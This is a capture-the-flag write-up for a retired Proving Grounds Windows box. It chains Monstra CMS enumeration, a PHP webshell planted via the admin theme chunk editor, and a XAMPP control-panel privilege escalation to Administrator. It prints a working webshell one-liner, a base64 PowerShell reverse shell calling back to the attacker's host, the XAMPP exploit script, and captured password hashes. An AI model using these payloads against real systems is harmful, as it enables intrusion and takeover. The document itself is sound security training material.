---
machine: Monster
platform: Proving Grounds
category: Windows
difficulty: Insane
tags: [monstra-cms, webshell, credential-exposure, xampp-privesc]
date: 2026-07-21
status: retired
summary: A Windows box running an old, unmaintained CMS behind XAMPP — testing CMS enumeration and a hand-built PHP webshell dropped through the admin theme editor for a foothold, then a known local privilege-escalation trick against the XAMPP control panel configuration to finish as Administrator.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/pelican]
└─$ nmap-full 192.168.133.180                                          
[*] Running fast port discovery on 192.168.133.180...
[sudo] password for kali: 
kali
[*] Open ports: 80,135,139,443,445,3389,5040,7680,49664,49665,49666,49667,49668,49669
[*] Running full scan on 192.168.133.180...
kali
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 22:36 -0400
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.133.180
Host is up (0.031s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_http-title: Mike Wazowski
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
|_http-title: Mike Wazowski
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-21T02:39:04+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Mike-PC
| Not valid before: 2026-07-20T02:32:00
|_Not valid after:  2027-01-19T02:32:00
| rdp-ntlm-info: 
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-21T02:38:49+00:00
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-21T02:38:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.68 seconds

```

We go to the webapp on port 80 and we see its running MeetMe, running searchsploit on this we find a Remote File Disclosure exploit that may or may not be useful:

```bash
┌──(kali㉿kali)-[~/oscp/pelican]
└─$ searchsploit meetme
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Web-MeetMe 3.0.3 - 'play.php' Remote File Disclosure                                                                      | php/webapps/4676.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```text
/--------------------------------------------------------------------------\
|Web-MeetMe 3.0.3 (play.php) Remote File Disclosure Vulnerability          |
|Download Script :                                                         |
| http://sourceforge.net/project/showfiles.php?group_id=164788             |
|POC :                                                                     |
| Web-MeetMe_v3.0.3/play.php?roomNo=../../../../../../../../etc/passwd%00  |
| Web-MeetMe_v3.0.3/play.php?bookid=../../../../../../../../etc/passwd%00  |
|Discovered by : Evil.Man                                                  |
|Home Page : Tryag.Com/cc                                                  |
|Email : Evil.Man@windowslive.com                                          |
|Sp.Thanx To : GoLd_M [Mahmood_ali"Tryag.Com"] & Sniper-Sa.Com             |
\--------------------------------------------------------------------------/

# milw0rm.com [2007-11-29]
```

This seems like a canonical path traversal via play.php, however after attempting it, it seems that this is not applicable to our box.

We continue on with our enumeration and feroxbust it and we find the admin panel at `https://192.168.133.180/blog/admin/`

```text
403      GET       42l       97w     1048c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       44l      102w     1060c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      411l      919w    14762c http://192.168.133.180/assets/js/nivo-lightbox.js
200      GET      184l      561w     5693c http://192.168.133.180/assets/js/wow.js
200      GET      142l      363w     3053c http://192.168.133.180/assets/css/slicknav.css
200      GET       94l      162w     2406c http://192.168.133.180/assets/js/main.js
200      GET        8l       36w     1074c http://192.168.133.180/assets/js/jquery.counterup.min.js
200      GET        7l       74w     4210c http://192.168.133.180/assets/img/logo.png
301      GET        9l       30w      342c http://192.168.133.180/blog => http://192.168.133.180/blog/
200      GET      205l     1368w     8097c http://192.168.133.180/assets/js/jquery.easing.min.js
200      GET      209l      473w     5773c http://192.168.133.180/assets/css/nivo-lightbox.css
200      GET       19l       75w     2917c http://192.168.133.180/assets/js/jquery.nav.js
200      GET       81l      187w     1465c http://192.168.133.180/assets/css/responsive.css
200      GET      781l     1212w    12910c http://192.168.133.180/assets/fonts/simple-line-icons.css
200      GET      471l     1389w    16748c http://192.168.133.180/assets/js/jquery.slicknav.js
200      GET        1l        7w      349c http://192.168.133.180/assets/css/about.css
200      GET     1130l     2227w    19253c http://192.168.133.180/assets/css/main.css
200      GET        5l      347w    19038c http://192.168.133.180/assets/js/popper.min.js
200      GET      539l     1442w    22916c http://192.168.133.180/index.html
200      GET       80l      280w     1835c http://192.168.133.180/assets/js/classie.js
200      GET       54l      353w    34279c http://192.168.133.180/assets/img/about/mike.jpg
200      GET        9l      104w     7843c http://192.168.133.180/assets/js/nivo-lightbox.min.js
200      GET        4l      114w     6503c http://192.168.133.180/assets/js/modernizr.custom.js
200      GET     2098l     4589w    50986c http://192.168.133.180/assets/js/jquery.mixitup.js
200      GET        4l       66w    29062c http://192.168.133.180/assets/fonts/font-awesome.min.css
200      GET      192l      668w    49634c http://192.168.133.180/assets/img/gallery/img-2.jpg
200      GET      187l      700w    50481c http://192.168.133.180/assets/img/gallery/img-4.jpg
200      GET        7l      567w    48944c http://192.168.133.180/assets/js/bootstrap.min.js
200      GET      233l      947w    75881c http://192.168.133.180/assets/img/gallery/img-6.jpg
200      GET        4l     1305w    84345c http://192.168.133.180/assets/js/jquery-min.js
200      GET       73l      429w    32536c http://192.168.133.180/assets/fonts/glyphicons-halflings-regular.woff2
200      GET        7l     1513w   144877c http://192.168.133.180/assets/css/bootstrap.min.css
200      GET      317l     1506w   118529c http://192.168.133.180/assets/img/gallery/img-1.jpg
200      GET     2744l     4898w    57095c http://192.168.133.180/assets/css/animate.css
200      GET      106l      587w    35387c http://192.168.133.180/assets/fonts/glyphicons-halflings-regular.eot
200      GET       94l      534w    42816c http://192.168.133.180/assets/fonts/glyphicons-halflings-regular.woff
200      GET        8l      165w     8044c http://192.168.133.180/assets/js/waypoints.min.js
200      GET       19l       51w      620c http://192.168.133.180/assets/js/scrolling-nav.js
200      GET       42l       93w      798c http://192.168.133.180/assets/js/menu.js
200      GET      310l     2069w   163622c http://192.168.133.180/assets/fonts/fontawesome-webfont.woff
404      GET       76l      215w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      491l     2474w   185951c http://192.168.133.180/assets/img/gallery/img-5.jpg
200      GET       23l       53w      625c http://192.168.133.180/assets/js/video.js
200      GET      260l     1635w   130134c http://192.168.133.180/assets/fonts/fontawesome-webfont.woff2
200      GET      143l      697w    54186c http://192.168.133.180/assets/fonts/line-icons/Simple-Line-Icons.woff2
200      GET      637l     3099w    64281c http://192.168.133.180/assets/fonts/line-icons/Simple-Line-Icons.ttf
200      GET      265l     1080w    78976c http://192.168.133.180/assets/img/gallery/img-3.jpg
200      GET      557l     3188w   271008c http://192.168.133.180/assets/img/hero-area.jpg
200      GET      539l     1442w    22916c http://192.168.133.180/
200      GET      282l     1653w   147429c http://192.168.133.180/assets/fonts/line-icons/Simple-Line-Icons.woff
301      GET        9l       30w      344c http://192.168.133.180/assets => http://192.168.133.180/assets/
200      GET      390l     2094w   135959c http://192.168.133.180/assets/fonts/fontawesome-webfont.eot
200      GET        4l     1298w    86659c http://192.168.133.180/assets/js/jquery-3.2.1.min.js
200      GET       98l      287w     4237c http://192.168.133.180/blog/home
200      GET      288l    13959w   108738c http://192.168.133.180/assets/fonts/glyphicons-halflings-regular.svg
200      GET       22l       65w     1023c http://192.168.133.180/blog/rss
200      GET      637l     3100w    64503c http://192.168.133.180/assets/fonts/line-icons/Simple-Line-Icons.eot
200      GET      685l    57230w   391622c http://192.168.133.180/assets/fonts/fontawesome-webfont.svg
200      GET      772l     1723w    58132c http://192.168.133.180/assets/fonts/glyphicons-halflings-regular.ttf
200      GET      200l    25095w   239045c http://192.168.133.180/assets/fonts/line-icons/Simple-Line-Icons.svg
200      GET     1304l     5478w   196149c http://192.168.133.180/assets/fonts/fontawesome-webfont.ttf
200      GET     2588l     4636w   239531c http://192.168.133.180/assets/fonts/FontAwesome.otf
200      GET     1753l    10037w   798602c http://192.168.133.180/assets/img/background/bg-1.jpg
200      GET       88l      217w     3652c http://192.168.133.180/blog/users
200      GET       98l      284w     4196c http://192.168.133.180/blog/0
301      GET        9l       30w      348c http://192.168.133.180/blog/admin => http://192.168.133.180/blog/admin/
403      GET       42l       97w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       30w      349c http://192.168.133.180/blog/public => http://192.168.133.180/blog/public/
200      GET       79l      208w     3615c http://192.168.133.180/blog/sitemap
301      GET        9l       30w      349c http://192.168.133.180/blog/engine => http://192.168.133.180/blog/engine/
301      GET        9l       30w      355c http://192.168.133.180/blog/admin/themes => http://192.168.133.180/blog/admin/themes/
200      GET       98l      287w     4228c http://192.168.133.180/blog/-
301      GET        9l       30w      356c http://192.168.133.180/blog/public/assets => http://192.168.133.180/blog/public/assets/
301      GET        9l       30w      356c http://192.168.133.180/blog/public/themes => http://192.168.133.180/blog/public/themes/

```

When we go here we see a username and password field with a login and a couple hyperlinks referring to Monstra CMS, including:

```text
© 2012 - 2016 [Monstra](http://monstra.org/about/license) – Version 3.0.4
```

Googling `Monstra Version 3.0.4 CVE` we find it is vulnerable to a few significant vulnerabilities:

```text
**Monstra CMS version 3.0.4** suffers from multiple severe security vulnerabilities, most notably **Remote Code Execution (RCE)**, **Arbitrary File Uploads**, and **Local File Inclusion (LFI)**. Because this CMS is notoriously unmaintained, most of these flaws do not have patches and can lead to full server compromise
```

After looking up exploits it seems that they almost all require authentication. So when we get creds or admin access we can return to them.

Referring back to our feroxbust we find users admin and mike at `/blog/users`

```text
# Users

|   |
|---|
||
|[admin](http://monster.pg/blog/users/1)|
|[mike](http://monster.pg/blog/users/2)|

[Sitemap](http://monster.pg/blog/sitemap)

Powered by [Monstra](http://monstra.org) 3.0.4
```

We from clicking on the links we find:

```text
|   |   |
|---|---|
|**Username**:|mike|
|**Email**:|mike@monster.pg|
|**Registered**:|22.2.2022|

|   |   |
|---|---|
|**Username**:|admin|
|**Email**:|wazowski@monster.pg|
|**Registered**:|22.2.2022|
```

And another monstra endpoint: `https://monster.pg/blog/admin/index.php?id=pages`

Reading more CVEs we see:

```text
**Credential Exposure:** CVE-2018-11480 permits unauthenticated access to `/storage/database/users.table.xml`, exposing user credentials hashed with a default, unchangeable salt (`YOUR_SALT_HERE`).
```

If we can get this to work this may aid us in getting the creds we need for an RCE CVE

We can use cewl to scrape words from the site to make a simple wordlist and bruteforce it against users admin and mike with burpsuite intruder:

`cewl <http://192.168.213.180:80/> | grep -v CeWL > wordlist.txt`

## Foothold

After much reading of RCE exploits and not having much success modifying and deploying them, I opted to perform the exploit manually.

Once in the admin panel you can go to Themes -> Create New Chunk and add php code in the chunk content field with an arbitrary name.

I opted to name mine `cmd` and use the simple PHP webshell code in the chunk content:

`<?php system($_GET[cmd]); ?>`

This means that the the php is rendered when we traverse to the `http://monster.pg/blog/public/themes/default/{filename}.chunk.php` and by appending ?cmd= to our cmd.chunk.php file we can execute arbitrary commands

```text
http://monster.pg/blog/public/themes/default/cmd.chunk.php?cmd=whoami

**Warning**: Use of undefined constant cmd - assumed 'cmd' (this will throw an Error in a future version of PHP) in **C:\xampp\htdocs\blog\public\themes\default\cmd.chunk.php** on line **1**  
mike-pc\mike
```

I used revshell's Powershell #3 (Base64) to encode my revshell and execute it in the ?cmd= field of my php webshell:

```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

──(kali㉿kali)-[~/oscp/monster]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.229] from (UNKNOWN) [192.168.133.180] 50427
whoami
mike-pc\mike
PS C:\xampp\htdocs\blog\public\themes\default> 
```

With a shell as Mike, we can retrieve the user flag from the desktop.

## Privilege Escalation

We run winpeas and find:

Internally facing UDP ports hosted by svchost (probably not a vector):

```text
UDP        127.0.0.1             1900          *:*                            4728              svchost
  UDP        127.0.0.1             54289         *:*                            4728              svchost
  UDP        127.0.0.1             60879         *:*                            440               svchost
```

```text
Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
```

```text
����������͹ Enumerating Security Packages Credentials (T1547.005)
  Version: NetNTLMv2
  Hash:    Mike::MIKE-PC:1122334455667788:8dca519b920daa71f31d5b0e7481b562:0101000000000000268b234d1a19dd01bf01f73697a5e374000000000800300030000000000000000000000000200000cb2b722927acb31abfff3df3bfca3dd330451f20e9f85a47bf4059bac7179f930a00100000000000000000000000000000000000090000000000000000000000     
```

```text
���������͹ Looking for possible password files in users homes (T1552.001)
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\Mike\AppData\Local\Microsoft\Edge\UserData\ZxcvbnData\3.0.0.0\passwords.txt
```

```text
����������͹ Looking for Linux shells/distributions - wsl.exe, bash.exe (T1059.004)
    C:\Windows\System32\wsl.exe
```

We try cracking the NTLMv2 Hash and fail to crack it with `hashcat -m 5600 hash.hash /usr/share/wordlists/rockyou.txt`

We can go to the directory in our webapp where it stores credentials and read it as we now have RCE:

```powershell
C:\xampp\htdocs\blog\storage\database>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 08DF-534D

 Directory of C:\xampp\htdocs\blog\storage\database

02/21/2022  11:42 PM    <DIR>          .
02/21/2022  11:42 PM    <DIR>          ..
04/05/2016  10:52 PM               507 menu.table.xml
02/21/2022  11:52 PM             1,876 options.table.xml
04/05/2016  10:52 PM             1,693 pages.table.xml
04/05/2016  10:52 PM             3,642 plugins.table.xml
02/21/2022  11:55 PM               820 users.table.xml
               5 File(s)          8,538 bytes
               2 Dir(s)   6,985,687,040 bytes free

C:\xampp\htdocs\blog\storage\database>type users.table.xml
type users.table.xml
<?xml version="1.0" encoding="UTF-8"?>
<root><options><autoincrement>2</autoincrement></options><fields><login/><password/><email/><role/><date_registered/><firstname/><lastname/><login/><twitter/><skype/><hash/><about_me/></fields><users><id>1</id><uid>de58425259</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>admin</login><password>a2b4e80cd640aaa6e417febe095dcbfc</password><email>wazowski@monster.pg</email><hash>jJkdUX1FOFiI</hash><date_registered>1645512776</date_registered><role>admin</role></users><users><id>2</id><uid>800c7d9797</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>mike</login><password>844ffc2c7150b93c4133a6ff2e1a2dba</password><email>mike@monster.pg</email><hash>8vPjvUPDHhRp</hash><date_registered>1645512909</date_registered><role>user</role></users></root>
```

while we know admin password is wazowski we dont yet know mike's password.

We attempt to crack either hashes but both fail.

We return to winPEAS and see we can write to C:\xampp. We write a `test.txt` file there and confirm we can. As we don't have many other third party scheduled tasks and services we can enumerate XAMPP for a privesc vulnerability. We can get our XAMPP version by reading its `properties.ini`

```text
C:\xampp>type properties.ini
type properties.ini
[General]
installdir=C:\xampp
base_stack_name=XAMPP
base_stack_key=
base_stack_version=7.3.10-1
base_stack_platform=windows-x64
[Apache]
apache_server_port=80
apache_server_ssl_port=443
apache_root_directory=/xampp/apache
apache_htdocs_directory=C:\xampp/htdocs
apache_domainname=127.0.0.1
apache_configuration_directory=C:\xampp/apache/conf
apache_unique_service_name=
[MySQL]
mysql_port=3306
mysql_host=localhost
mysql_root_directory=C:\xampp\mysql
mysql_binary_directory=C:\xampp\mysql\bin
mysql_data_directory=C:\xampp\mysql\data
mysql_configuration_directory=C:\xampp/mysql/bin
mysql_arguments=-u root -P 3306
mysql_unique_service_name=
[PHP]
php_binary_directory=C:\xampp\php
php_configuration_directory=C:\xampp\php
php_extensions_directory=C:\xampp\php\ext

┌──(kali㉿kali)-[192.168.45.222]-[~/oscp/monster]
└─$ searchsploit xampp privilege escalation
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
XAMPP 7.4.3 - Local Privilege Escalation                                                                  | windows/local/50337.ps1
XAMPP for Windows 1.6.3a - Local Privilege Escalation                                                     | windows/local/4325.php
---------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We see the `windows/local/50337.ps1` exploit is later than our version so we can attempt to exploit this.

The exploit is as follows:

```powershell
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```

So I made a revshell that calls back to port 3333, uploaded it to the box, modified the exploit.ps1 script to set the `$replace` env variable to the path of my revshell and then restarted the box using my SeShutdownPrivilege

`shutdown /r /t 0`

We can then catch the shell and see that we are administrator:

```powershell
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
mike-pc\administrator
```
